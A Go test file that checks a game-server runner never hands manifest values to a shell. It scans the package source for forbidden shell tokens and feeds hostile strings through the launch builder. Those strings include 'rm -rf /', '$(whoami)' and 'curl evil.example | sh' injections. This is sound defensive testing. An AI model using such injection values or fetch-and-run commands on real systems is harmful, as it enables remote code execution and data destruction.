package runner

import (
	"os"
	"path/filepath"
	"reflect"
	"slices"
	"strings"
	"testing"

	"github.com/S95F/gameVPSmanager/internal/spec"
)

// The runner never spawns a shell. This file is the assertion, in two halves:
// a structural one that greps this package's own source, and a behavioural one
// that pushes shell metacharacters through the launch builder and proves they
// come out the other side as inert argv elements.
//
// Why it needs its own test file: every value in a game's argv came out of a
// manifest template with operator-supplied variables in it. `server_name` is
// typed into a web form. If any code path here ever concatenated those values
// into one string and handed it to `sh -c`, a server name would be a remote
// code execution with a YAML file as the payload -- and the bug would be one
// convenient-looking refactor away, invisible in review, and silent in every
// test that only checked the server started.

// forbidden are the tokens that must not appear in this package's source. Each
// one is a specific way a shell or a PATH lookup gets back in.
var forbidden = []struct {
	token string
	why   string
}{
	{"/bin/sh", "a shell interpreter"},
	{"/bin/bash", "a shell interpreter"},
	{"/usr/bin/env", "env resolves its argument through PATH"},
	{`"sh"`, "a shell interpreter"},
	{`"bash"`, "a shell interpreter"},
	{`"-c"`, "the flag that makes a shell parse a string as a command"},
	{"exec.Command(", "exec.Command consults PATH when the name has no separator"},
	{"exec.CommandContext(", "CommandContext SIGKILLs the child when the context ends, which would lose a world mid-save"},
	{"exec.LookPath", "a PATH lookup decides which binary starts the world"},
	{"os.Getenv(\"PATH\")", "nothing here may resolve a program through PATH"},
}

func TestTheRunnerSourceContainsNoShell(t *testing.T) {
	entries, err := os.ReadDir(".")
	if err != nil {
		t.Fatal(err)
	}
	var scanned int
	for _, e := range entries {
		name := e.Name()
		if e.IsDir() || !strings.HasSuffix(name, ".go") || strings.HasSuffix(name, "_test.go") {
			continue
		}
		b, err := os.ReadFile(name)
		if err != nil {
			t.Fatal(err)
		}
		scanned++
		for i, line := range strings.Split(string(b), "\n") {
			// Comments are where these tokens legitimately appear, explaining
			// why they are absent from the code.
			if code, _, _ := strings.Cut(line, "//"); strings.TrimSpace(code) != "" {
				line = code
			} else {
				continue
			}
			for _, f := range forbidden {
				if strings.Contains(line, f.token) {
					t.Errorf("%s:%d contains %q (%s):\n\t%s",
						name, i+1, f.token, f.why, strings.TrimSpace(line))
				}
			}
		}
	}
	// A scan that found no files would pass silently forever.
	if scanned < 8 {
		t.Fatalf("scanned only %d source files; the walk is broken", scanned)
	}
	if _, err := os.Stat(filepath.Join(".", "spawn_linux.go")); err != nil {
		t.Fatalf("spawn_linux.go was not scanned: %v", err)
	}
}

func TestArgvIsAListWithTheResolvedPathFirst(t *testing.T) {
	l, err := BuildLaunch(testManifest(), testRenderer(), nil)
	if err != nil {
		t.Fatal(err)
	}
	want := []string{"/opt/pzserver/start-server.sh", "-servername", "My Server"}
	if got := l.Argv(); !reflect.DeepEqual(got, want) {
		t.Fatalf("Argv = %q, want %q", got, want)
	}
	// Argv must not alias Args: a caller that sorted or truncated the returned
	// slice would be editing the launch itself.
	l.Argv()[1] = "clobbered"
	if l.Args[0] != "-servername" {
		t.Errorf("Argv aliases Args: %q", l.Args)
	}
}

func TestShellMetacharactersSurviveAsInertArguments(t *testing.T) {
	// Each of these is a working command injection if the argv is ever joined
	// into a string and interpreted. As argv elements they are just bytes: a
	// server whose name contains a semicolon is a server with a silly name.
	hostile := []string{
		`; rm -rf /`,
		`$(whoami)`,
		"`id`",
		`" && curl evil.example/x | sh && "`,
		`| tee /etc/passwd`,
		`$HOME`,
		`~root`,
		`*`,
		`a && b`,
		`\`,
	}
	for _, name := range hostile {
		m := testManifest()
		m.Spec.Runtime.Args = spec.Args{{Value: "-servername"}, {Value: "{{ .Var.server_name }}"}}
		r := spec.NewRenderer(spec.RenderData{
			Install: "/opt/pzserver",
			Home:    "/home/pzserver",
			Var:     spec.VarValues{"server_name": name},
		})
		l, err := BuildLaunch(m, r, nil)
		if err != nil {
			t.Errorf("%q: BuildLaunch: %v", name, err)
			continue
		}
		if got := l.Argv(); !reflect.DeepEqual(got, []string{"/opt/pzserver/start-server.sh", "-servername", name}) {
			t.Errorf("%q: argv = %q", name, got)
		}
		// And the program is still the program: nothing in a value may change
		// what gets executed.
		if l.Path != "/opt/pzserver/start-server.sh" {
			t.Errorf("%q: Path = %q", name, l.Path)
		}
	}
}

func TestAHostileValueCannotChangeTheProgram(t *testing.T) {
	// The exec field is itself a template. A rendered value that tried to
	// smuggle in a second command has nowhere to put it: there is no string to
	// split, so the whole thing is one path, and a path with no separator is
	// refused outright rather than looked up on PATH.
	m := testManifest()
	m.Spec.Runtime.Exec = "{{ .Var.entry }}"
	m.Spec.Runtime.Args = spec.Args{{Value: "-nographics"}, {Value: "-batchmode"}}
	r := spec.NewRenderer(spec.RenderData{
		Install: "/opt/pzserver",
		Var:     spec.VarValues{"entry": "./start-server.sh; curl evil.example | sh"},
	})
	l, err := BuildLaunch(m, r, nil)
	if err != nil {
		t.Fatalf("BuildLaunch: %v", err)
	}
	if l.Path != "/opt/pzserver/start-server.sh; curl evil.example | sh" {
		t.Fatalf("Path = %q", l.Path)
	}
	// One path, which will simply fail to exist -- and preflight says so
	// before anything is started.
	if len(l.Argv()) != 3 {
		t.Errorf("argv = %q; the exec was split", l.Argv())
	}
}

func TestEnvironmentValuesAreNotExpanded(t *testing.T) {
	// os/exec passes Env straight to execve, so "$HOME" is four characters and
	// not a substitution. Asserting it keeps anyone from "fixing" the env
	// builder with os.ExpandEnv, which would make a manifest able to read the
	// runner's own environment.
	m := testManifest()
	m.Spec.Runtime.Args = nil
	m.Spec.Runtime.Env = map[string]string{"GREETING": "{{ .Var.msg }}"}
	r := spec.NewRenderer(spec.RenderData{
		Install: "/opt/pzserver",
		Var:     spec.VarValues{"msg": "$HOME `id` $(whoami)"},
	})
	l, err := BuildLaunch(m, r, nil)
	if err != nil {
		t.Fatal(err)
	}
	if !slices.Contains(l.Env, "GREETING=$HOME `id` $(whoami)") {
		t.Errorf("env = %q", l.Env)
	}
}
